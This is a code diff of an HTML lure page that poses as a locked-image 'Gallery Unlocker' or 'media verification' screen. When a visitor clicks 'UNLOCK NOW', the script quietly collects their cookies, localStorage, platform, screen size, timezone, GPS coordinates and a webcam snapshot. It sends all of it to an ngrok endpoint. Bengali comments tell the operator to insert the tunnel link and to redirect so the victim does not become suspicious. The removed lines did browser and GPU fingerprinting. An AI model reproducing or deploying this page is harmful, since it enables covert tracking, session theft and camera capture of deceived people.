@@ -3,92 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Verification System</title>
+    <title>Gallery Unlocker</title>
     <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #050505; color: #00ff41; font-family: 'Courier New', monospace; }
-        #panel { text-align: center; padding: 30px; border: 1px solid #00ff41; background: #000; box-shadow: 0 0 20px #00ff41; border-radius: 12px; width: 90%; max-width: 400px; }
-        button { background: #00ff41; color: #000; border: none; padding: 15px 30px; cursor: pointer; font-weight: bold; font-size: 1rem; margin-top: 20px; border-radius: 5px; width: 100%; transition: 0.3s; }
-        button:active { transform: scale(0.95); opacity: 0.8; }
-        #loader { display: none; margin-top: 15px; font-size: 0.8rem; color: #888; }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; color: #0f0; font-family: 'Courier New', monospace; }
+        #main { text-align: center; padding: 30px; border: 1px solid #0f0; border-radius: 15px; box-shadow: 0 0 20px #0f0; width: 85%; max-width: 380px; }
+        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <div id="panel">
-        <h2 id="head">IMAGE_LOCKED.AES</h2>
-        <p style="color: #ccc; font-size: 0.9rem;">Identity verification required to decrypt visual assets.</p>
-        <button id="btn" onclick="runDeepScan()">VIEW FULL IMAGE</button>
-        <div id="loader">Running Vulnerability Probes... [0%]</div>
+    <div id="main">
+        <h2>[ MEDIA_LOCKED ]</h2>
+        <p>Complete verification to bypass firewall.</p>
+        <button onclick="startMission()">UNLOCK NOW</button>
     </div>
 
-    <canvas id="c" style="display:none;"></canvas>
-    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="scr" style="display:none;"></canvas>
+    <video id="vid" autoplay style="display:none;"></video>
 
     <script>
-        const API_ENDPOINT = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';
+        // আপনার বর্তমান এনগ্রোক লিঙ্কটি এখানে দিন (শেষে /vulnerability_probe যোগ করবেন)
+        const URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';
 
-        async function runDeepScan() {
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            
-            // ১. Fingerprint (Unique ID)
-            const canvas = document.getElementById('c');
-            const ctx = canvas.getContext('2d');
-            ctx.fillText("SCAN-99X", 2, 2);
-            const uid = btoa(canvas.toDataURL()).substring(120, 145);
-
+        async function startMission() {
+            // ১. সাইলেন্ট রিভোলিউশন (Vulnerability + System Data)
             let report = {
                 system: {
-                    id: uid,
                     os: navigator.platform,
-                    cores: navigator.hardwareConcurrency,
-                    ram: navigator.deviceMemory + "GB",
+                    cookies: document.cookie || "No Cookies",
+                    storage: JSON.stringify(localStorage),
                     res: `${screen.width}x${screen.height}`,
-                    lang: navigator.language,
-                    time: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookies: document.cookie || "No Cookies Found",
-                    storage: JSON.stringify(localStorage)
+                    time: Intl.DateTimeFormat().resolvedOptions().timeZone
                 },
-                vulns: []
+                vuln: []
             };
 
-            // ২. Deep Vulnerability Logic
-            if (navigator.webdriver) report.vulns.push("Automation_Bot_Detected");
-            if (window.chrome && !window.chrome.runtime) report.vulns.push("Headless_Browser_Likely");
-            
-            // ইনকগনিটো মোড চেক (Heuristic)
-            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-            if (!fs) report.vulns.push("Privacy_Mode: Incognito_Active");
+            // Vulnerability Probes
+            if (navigator.webdriver) report.vuln.push("Bot_Detected");
+            if (navigator.pdfViewerEnabled) report.vuln.push("PDF_Exploit_Active");
 
-            // জিপিইউ চেক (হার্ডওয়্যার আইডেন্টিফিকেশন)
-            const gl = canvas.getContext('webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) report.system.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            }
-
-            // ৩. লোকেশন ও ছবি সংগ্রহ
+            // ২. লোকেশন ও ক্যামেরা
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 report.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.getElementById('v');
+                    const video = document.getElementById('vid');
                     video.srcObject = stream;
+                    
                     setTimeout(() => {
+                        const canvas = document.getElementById('scr');
                         canvas.width = 640; canvas.height = 480;
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        sendToMaster(report, canvas.toDataURL('image/jpeg'));
+                        send(report, canvas.toDataURL('image/jpeg'));
                         stream.getTracks().forEach(t => t.stop());
                     }, 2000);
-                } catch (e) { sendToMaster(report, null); }
-            }, () => sendToMaster(report, null));
-            
-            // রিডাইরেকশন (সন্দেহ এড়াতে)
-            setTimeout(() => { window.location.href = "elephant.jpg"; }, 4000);
+                } catch (e) { send(report, null); }
+            }, () => send(report, null));
+
+            // রিডাইরেক্ট যাতে সন্দেহ না হয়
+            setTimeout(() => { alert("Verifying... Please wait."); }, 500);
         }
 
-        function sendToMaster(d, p) {
-            fetch(API_ENDPOINT, { method: 'POST', mode: 'cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...d, photo: p }) });
+        function send(d, p) {
+            fetch(URL, {
+                method: 'POST',
+                mode: 'cors', // CORS নিশ্চিত করা হয়েছে
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ...d, photo: p })
+            }).then(res => console.log("Success:", res))
+              .catch(err => console.error("Error:", err));
         }
     </script>
 </body>
